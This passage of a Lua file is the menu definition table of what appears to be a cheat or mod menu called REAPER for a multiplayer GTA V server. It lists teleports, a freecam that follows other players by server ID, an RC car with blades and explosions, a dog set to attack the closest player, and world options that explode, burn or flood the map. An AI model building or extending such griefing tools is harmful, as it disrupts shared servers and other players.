            {text = 'Madrazos ranch', dkey = 'teleport:misc_10', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(1399, 1150, 115)},
            {text = 'Life invader office', dkey = 'teleport:misc_11', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1044.193, -236.9535, 37.96496)},
            {text = 'Lester\'s house', dkey = 'teleport:misc_12', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(1273.9, -1719.305, 54.77141)},
            {text = 'Fbi top floor', dkey = 'teleport:misc_13', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(134.5835, -749.339, 258.152)},
            {text = 'Fbi floor 47', dkey = 'teleport:misc_14', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(134.5835, -766.486, 234.152)},
            {text = 'Fbi floor 49', dkey = 'teleport:misc_15', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(134.635, -765.831, 242.152)},
            {text = 'Iaa office', dkey = 'teleport:misc_16', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(117.22, -620.938, 206.1398)},
            {text = 'Smuggler\'s run hangar', dkey = 'teleport:misc_17', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1266.802, -3014.837, -49.000)},
            {text = 'Avenger interior', dkey = 'teleport:misc_18', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(520.0, 4750.0, -70.0)},
            {text = 'Facility', dkey = 'teleport:misc_19', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(345.0041, 4842.001, -59.9997)},
            {text = 'Server farm', dkey = 'teleport:misc_20', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(2168.0, 2920.0, -84.0)},
            {text = 'Submarine', dkey = 'teleport:misc_21', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(514.33, 4886.18, -62.59)},
            {text = 'Iaa facility', dkey = 'teleport:misc_22', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(2147.91, 2921.0, -61.9)},
            {text = 'Nightclub', dkey = 'teleport:misc_23', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1604.664, -3012.583, -78.000)},
            {text = 'Nightclub warehouse', dkey = 'teleport:misc_24', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1505.783, -3012.587, -80.000)},
            {text = 'Terrorbyte interior', dkey = 'teleport:misc_25', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1421.015, -3012.587, -80.000)},
        },

        ['misc'] = {
            {text = 'Freecam', dkey = 'misc:freecam', desc = 'Freecam menu.', option = __REAPER1__.M.Menu_Button, func = {'misc', 'misc:freecam'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Rc car', dkey = 'misc:rccar', desc = 'Rc car menu.', option = __REAPER1__.M.Menu_Button, func = {'misc', 'misc:rccar'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Controls', dkey = 'misc:controls',  desc = 'Controls menu.', option = __REAPER1__.M.Menu_Button, func = {'misc', 'misc:controls'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Hud elements', dkey = 'misc:hudelements', desc = 'Hud elements menu.', option = __REAPER1__.M.Menu_Button, func = {'misc', 'misc:hudelements'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'K9 unit', dkey = 'misc:k9unit', desc = 'K9 unit menu.', option = __REAPER1__.M.Menu_Button, func = {'misc', 'misc:k9unit'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Anti Afk', option = __REAPER1__.M.Separator},
            {text = 'Anti afk', dkey = 'misc_antiafk', desc = 'Enable the anti afk.', afu = __REAPER1__.M.misc.antiafk, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Move', dkey = 'misc_move', desc = 'Choose what the anti afk should move.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'What to move for the anti afk', length = 10, tipus = 'betu', func = {'Camera', 'Ped', 'Both'}},
            {text = 'Length', dkey = 'misc_length', desc = 'The length of how long should the anti\nafk movement go for.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Movement length number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Interval (sec)', dkey = 'misc_interval', desc = 'The time between the movements.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Interval number', length = 3, tipus = 'szam', func = __REAPER1__.T.Tizezres},
            {text = 'Field Of View', option = __REAPER1__.M.Separator},
            {text = 'Override fov', dkey = 'misc_overridefov', desc = 'Override your current field of view.', afu = __REAPER1__.M.misc.overridefov, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Field of view', dkey = 'misc_fieldofview', desc = 'Set the field of view value to override.', afu = __REAPER1__.M.misc.fov, option = __REAPER1__.M.Combo, cindex = math.ceil(__REAPER1__.N.GetGameplayCamFov()) + 1, sindex = math.ceil(__REAPER1__.N.GetGameplayCamFov()) + 1, textboxtext = 'Field of view number', length = 3, tipus = 'szam', func = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130}},
            {text = 'Force player view', dkey = 'misc_forceplycamera', desc = 'Force a player camera type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Player camera type', length = 20, tipus = 'betu', toggle = false, func = {'Third Person Close', 'Third Person Mid', 'Third Person Far', 'First Person'}},
            {text = 'Radar', option = __REAPER1__.M.Separator},
            {text = 'Force radar', dkey = 'misc_forceradar', desc = 'Force the mini-map to be shown or\nhidden.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Radar force type', length = 10, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Extended', dkey = 'misc_extended', desc = 'Choose a type of the extended radar\nand enable it.', afu = __REAPER1__.M.misc.radar, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Extended radar type', length = 10, tipus = 'betu', toggle = false, func = {'Normal', 'Full map'}},
            {text = '2 dimension', dkey = 'misc_2dimension', desc = 'Force the radar to be 2 dimensional.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Center self', dkey = 'misc_centerself', desc = 'Make it so you\'ll always be the center\nof the radar.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Zoom level', dkey = 'misc_zoomlevel', desc = 'The zoom level of the radar.', afu = __REAPER1__.M.misc.zoom, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Radar zoom level number', length = 3, tipus = 'szam', func = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200}},
            {text = 'Screen', option = __REAPER1__.M.Separator},
            {text = 'Bypass black screen', dkey = 'misc_bypassblackscreen', desc = 'Bypass the black screen.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Bypass screen blur', dkey = 'misc_bypassscreenblur', desc = 'Bypass the screen blur.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Misc', option = __REAPER1__.M.Separator},
            {text = 'Portable radio', dkey = 'misc_portableradio', desc = 'Enable the portable radio. Works the\nsame as a car radio.', afu = __REAPER1__.M.misc.radio, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Set wetness', dkey = 'misc_setwetness', desc = 'Set your ped\'s clothes wet.', afu = __REAPER1__.M.misc.setwet, option = __REAPER1__.M.Button},
            {text = 'Clear wetness', dkey = 'misc_clearwetness', desc = 'Clear your ped\'s clothing wetness.', afu = __REAPER1__.M.misc.clearwet, option = __REAPER1__.M.Button},
            {text = 'Clear blood', dkey = 'misc_clearblood', desc = 'Clear the blood damage on your ped.', afu = __REAPER1__.M.misc.clearblood, option = __REAPER1__.M.Button},
            {text = 'Clear limb', dkey = 'misc_clearlimb', desc = 'Clear your ped\'s last damaged area.', afu = __REAPER1__.M.misc.clearlimb, option = __REAPER1__.M.Button},
        },

        ['misc:freecam'] = {
            {text = 'Toggle freecam', dkey = 'misc:freecam_freecam', desc = 'Toggle the freecam.', afu = __REAPER1__.M.misc.freecam.freecam, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Sensitivity', dkey = 'misc:freecam_sensitivity', desc = 'The mouse sensitivity of the freecam.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Sensitivity number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Speed', dkey = 'misc:freecam_speed', desc = 'Set the freecam speed.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Speed number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Reset fov', dkey = 'misc:freecam_resetfov', desc = 'Reset the freecam field of view.', afu = __REAPER1__.M.misc.freecam.resetfov, option = __REAPER1__.M.Button},
            {text = 'Teleport', dkey = 'misc:freecam_teleport', desc = 'Teleport to the position where you turn\noff the freecam.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Keep coords', dkey = 'misc:freecam_keepcoords', desc = 'When turning on the freecam it will be\nset to the last turn off position.', afu = __REAPER1__.M.misc.freecam.keepcoords, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Cam to player', dkey = 'misc:freecam_camtoplayer', desc = 'Teleport the freecam to a player server\nid you enter.', afu = __REAPER1__.M.misc.freecam.tptoply, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Player id number', length = 4, tipus = 'szam', func = 0},
            {text = 'Crosshair', dkey = 'misc:freecam_crosshair', desc = 'Enable the freecam crosshair.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Coordinates', dkey = 'misc:freecam_coords', desc = 'Display the coordinates where you are\nlooking at.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Entity hover', dkey = 'misc:freecam_entityhover', desc = 'When hovering over an entity the\ncrosshair will be more transparent.', option = __REAPER1__.M.Checkbox, func = false},
        },

        ['misc:rccar'] = {
            {text = 'Rc car', dkey = 'misc:rccar_rccar', desc = 'Spawn or disable the rc car.', afu = __REAPER1__.M.misc.rccar.rccar, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'At coords', dkey = 'misc:rccar_atcoords', desc = 'Spawn the rc car to the specified\ncoords.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Spawn coords', length = 30, tipus = 'vegyes', func = 'None'},
            {text = 'Delete', dkey = 'misc:rccar_delete', desc = 'Delete the rc car when you disable it.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Blip', dkey = 'misc:rccar_blip', desc = 'Enable the blip on the rc car.', afu = __REAPER1__.M.misc.rccar.blip, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Invisible', dkey = 'misc:rccar_invisible', desc = 'Spawn the rc car invisible.', afu = __REAPER1__.M.misc.rccar.invisible, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Godded', dkey = 'misc:rccar_god', desc = 'Spawn the rc car god moded.', afu = __REAPER1__.M.misc.rccar.god, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Blade', option = __REAPER1__.M.Separator},
            {text = 'Blade', dkey = 'misc:rccar_blade', desc = 'Enable the blade on the rc car.', afu = __REAPER1__.M.misc.rccar.blade, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Rotor key', dkey = 'misc:rccar_rotorkey', desc = 'When the rotor key is pressed, the blade\nwill spin.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Rotor key', length = 3, tipus = 'betu', toggle = false, func = __REAPER1__.T.Keys},
            {text = 'Invisible', dkey = 'misc:rccar_binvisible', desc = 'Spawn the blade invisible.', afu = __REAPER1__.M.misc.rccar.binvisible, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Godded', dkey = 'misc:rccar_bgod', desc = 'Spawn the blade godded.', afu = __REAPER1__.M.misc.rccar.bfod, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Explosion', option = __REAPER1__.M.Separator},
            {text = 'Explosion', dkey = 'misc:rccar_explosion', desc = 'Enable the explosions.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Type', dkey = 'misc:rccar_type', desc = 'The explosion type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Explosion type', length = 3, tipus = 'betu', func = __REAPER1__.T.Explosions},
            {text = 'Explosion key', dkey = 'misc:rccar_explosionkey', desc = 'When the explosion key is pressed, the\nexplosion will happen.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Explosion key', length = 3, tipus = 'betu', func = __REAPER1__.T.Keys},
            {text = 'Invisible', dkey = 'misc:rccar_einvisible', desc = 'Make the explosions invisible.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Audible', dkey = 'misc:rccar_audible', desc = 'Make the explosions audible.', option = __REAPER1__.M.Checkbox, func = false},
        },

        ['misc:controls'] = {
            {text = 'Enable all', dkey = 'misc:controls_enableall', desc = 'Enable every control action.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Disable all', dkey = 'misc:controls_disableall', desc = 'Disable every control action.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Name', option = __REAPER1__.M.Separator},
            {text = 'Imitate', dkey = 'misc:controls_force', desc = 'Imitate a key press for a chosen key.', afu = __REAPER1__.M.misc.controls.imitate, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Key name to imitate', length = 4, tipus = 'vegyes', func = __REAPER1__.T.Keys},
            {text = 'Loop', dkey = 'misc:controls_loop', desc = 'Loop imitating a key press for a chosen\nkey.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Enable by name', dkey = 'misc:controls_enable', desc = 'Enable a control by name.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Key name to enable', length = 4, tipus = 'vegyes', toggle = false, func = __REAPER1__.T.Keys},
            {text = 'Disable by name', dkey = 'misc:controls_disable', desc = 'Disable a control by name.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Key name to disable', length = 4, tipus = 'vegyes', toggle = false, func = __REAPER1__.T.Keys},
            {text = 'Index', option = __REAPER1__.M.Separator},
            {text = 'Imitate', dkey = 'misc:controls_iforce', desc = 'Imitate a key press for a chosen index.', afu = __REAPER1__.M.misc.controls.iimitate, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Key index name to imitate', length = 4, tipus = 'vegyes', func = __REAPER1__.T.KeyIndexes},
            {text = 'Loop', dkey = 'misc:controls_iloop', desc = 'Loop imitating a key press for a chosen\nindex.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Enable by index', dkey = 'misc:controls_ienable', desc = 'Enable a control by index.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Key index to enable', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.KeyIndexes},
            {text = 'Disable by index', dkey = 'misc:controls_idisable', desc = 'Disable a control by index.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Key index to disable', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.KeyIndexes},
        },

        ['misc:hudelements'] = {
            {text = 'Hud color', dkey = 'misc:hudelements_hudcolor', desc = 'Set the color and alpha of the hud.\nFormat: r g b a.', afu = __REAPER1__.M.misc.hudelements.hudcolor, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Hud color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Wanted stars', dkey = 'misc:hudelements_1', desc = 'Force the wanted stars.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Weapon icon', dkey = 'misc:hudelements_2', desc = 'Force the weapon icon.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Cash', dkey = 'misc:hudelements_3', desc = 'Force the cash.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'MP cash', dkey = 'misc:hudelements_4', desc = 'Force the mpcash.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Messages', dkey = 'misc:hudelements_5', desc = 'Force the messages.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Vehicle name', dkey = 'misc:hudelements_6', desc = 'Force the vehicle name.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Area name', dkey = 'misc:hudelements_7', desc = 'Force the area name.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Vehicle class', dkey = 'misc:hudelements_8', desc = 'Force the vehicle class.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Street name', dkey = 'misc:hudelements_9', desc = 'Force the street name.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Help text', dkey = 'misc:hudelements_10', desc = 'Force the help text.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Floating help text 1', dkey = 'misc:hudelements_11', desc = 'Force the floating help text 1.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Floating help text 2', dkey = 'misc:hudelements_12', desc = 'Force the floating help text 2.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Cash change', dkey = 'misc:hudelements_13', desc = 'Force the cash change.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Crosshair', dkey = 'misc:hudelements_14', desc = 'Force the crosshair.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Subtitle text', dkey = 'misc:hudelements_15', desc = 'Force the subtitle text', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Radio stations', dkey = 'misc:hudelements_16', desc = 'Force the radio stations.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Saving game', dkey = 'misc:hudelements_17', desc = 'Force the saving game.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Game stream', dkey = 'misc:hudelements_18', desc = 'Force the game stream.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Weapon wheel', dkey = 'misc:hudelements_19', desc = 'Force the weapon wheel.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Weapon wheel stats', dkey = 'misc:hudelements_20', desc = 'Force the weapon wheel stats.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Max hud comps', dkey = 'misc:hudelements_21', desc = 'Force the max hud components.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
            {text = 'Max hud weapons', dkey = 'misc:hudelements_22', desc = 'Force the max hud weapons.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hud force type', length = 6, tipus = 'betu', toggle = false, func = {'Show', 'Hidden'}},
        },

        ['misc:k9unit'] = {
            {text = 'Deploy K9', dkey = 'misc:k9unit_deploy', desc = 'Toggle the k9 unit.', afu = __REAPER1__.M.misc.k9.deploy, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'At coords', dkey = 'misc:k9unit_atcoords', desc = 'Deploy the k9 to the specified\ncoords.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Deploy coords', length = 30, tipus = 'vegyes', func = 'None'},
            {text = 'Breed', dkey = 'misc:k9unit_breed', desc = 'The dog breed.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Dog breed', length = 10, tipus = 'betu', func = {'Chop', 'Husky', 'Retriever', 'Westy', 'Shepherd', 'Rottweiler', 'Pug'}},
            {text = 'Defend', dkey = 'misc:k9unit_defend', desc = 'The dog will always attack your\nattacker.', afu = __REAPER1__.M.misc.k9.defend, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Follow', dkey = 'misc:k9unit_follow', desc = 'The dog will follow you.', afu = __REAPER1__.M.misc.k9.follow, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Attack closest', dkey = 'misc:k9unit_attackclosest', desc = 'Attack the closest player.', afu = __REAPER1__.M.misc.k9.attack, option = __REAPER1__.M.Button},
            {text = 'Sit', dkey = 'misc:k9unit_sit', desc = 'Make the dog sit or stand.', afu = __REAPER1__.M.misc.k9.sit, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Invisible', dkey = 'misc:k9unit_invisible', desc = 'Make the dog invisible.', afu = __REAPER1__.M.misc.k9.invis, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Godded', dkey = 'misc:k9unit_godded', desc = 'Make the dog godded.', afu = __REAPER1__.M.misc.k9.god, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Blip', dkey = 'misc:k9unit_blip', desc = 'Enable the blip on the dog.', afu = __REAPER1__.M.misc.k9.blip, option = __REAPER1__.M.Checkbox, func = false},
        },

        ['world'] = {
            {text = 'Always lit', dkey = 'world:alwayslit', desc = 'Always lit menu.', option = __REAPER1__.M.Menu_Button, func = {'world', 'world:alwayslit'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Hover', dkey = 'world:hover', desc = 'Hover menu.', option = __REAPER1__.M.Menu_Button, func = {'world', 'world:hover'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Pedestrians', dkey = 'world:peds', desc = 'Pedestrians menu.', option = __REAPER1__.M.Menu_Button, func = {'world', 'world:peds'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Vehicles', dkey = 'world:vehicles', desc = 'Vehicles menu.', option = __REAPER1__.M.Menu_Button, func = {'world', 'world:vehicles'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Objects', dkey = 'world:objects', desc = 'Objects menu.', option = __REAPER1__.M.Menu_Button, func = {'world', 'world:objects'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Model changer', dkey = 'world:modelchange', desc = 'Model swap menu.', option = __REAPER1__.M.Menu_Button, func = {'world', 'world:modelchange'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Time', dkey = 'world:time', desc = 'Time menu.', option = __REAPER1__.M.Menu_Button, func = {'world', 'world:time'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Black magic', dkey = 'world:blackmagic', desc = 'Black magic menu.', option = __REAPER1__.M.Menu_Button, func = {'world', 'world:blackmagic'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'IPL loader', dkey = 'world:iplloader', desc = 'Ipl loader menu.', option = __REAPER1__.M.Menu_Button, func = {'world', 'world:iplloader'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'General', option = __REAPER1__.M.Separator},
            {text = 'Meteor shower', dkey = 'world_meteorshower', desc = 'Enable the meteor shower on the\nwhole map.', afu = __REAPER1__.M.world.meteor, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Rain', dkey = 'world_rain', desc = 'Rain peds or vehicles from the sky.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Rain type', length = 10, tipus = 'betu', toggle = false, func = {'Peds', 'Vehicles'}},
            {text = 'Object junk', dkey = 'world_objectjunk', desc = 'Junk the whole map with objects.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Pedestrian junk', dkey = 'world_pedjunk', desc = 'Junk the whole map with pedestrians.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Vehicle junk', dkey = 'world_vehiclejunk', desc = 'Junk the whole map with vehicles.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Explode world', dkey = 'world_explodeworld', desc = 'Create explosions on the world.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Burn world', dkey = 'world_burnworld', desc = 'Set the world on fire.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Gravity', dkey = 'world_gravity', desc = 'Set the gravity level.', afu = __REAPER1__.M.world.gravity, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Gravity level number', length = 1, tipus = 'szam', func = {0, 1, 2, 3}},
            {text = 'Clear area', option = __REAPER1__.M.Separator},
            {text = 'Radius', dkey = 'world_radius', desc = 'The area radius size.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Radius size number', length = 4, tipus = 'szam', func = __REAPER1__.T.Ezres},
            {text = 'Everything', dkey = 'world_everything', desc = 'Clear everything from the specified\narea.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Projectiles', dkey = 'world_projectiles', desc = 'Clear the projectiles from the specified\narea.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Objects', dkey = 'world_objects', desc = 'Clear the obcjest from the specified\narea.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Pedestrians', dkey = 'world_peds', desc = 'Clear the pedestrians from the specified\narea.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Cops', dkey = 'world_cops', desc = 'Clear the cops from the specified area.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Vehicles', dkey = 'world_vehicles', desc = 'Clear the vehicles from the specified\narea.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Weather', option = __REAPER1__.M.Separator},
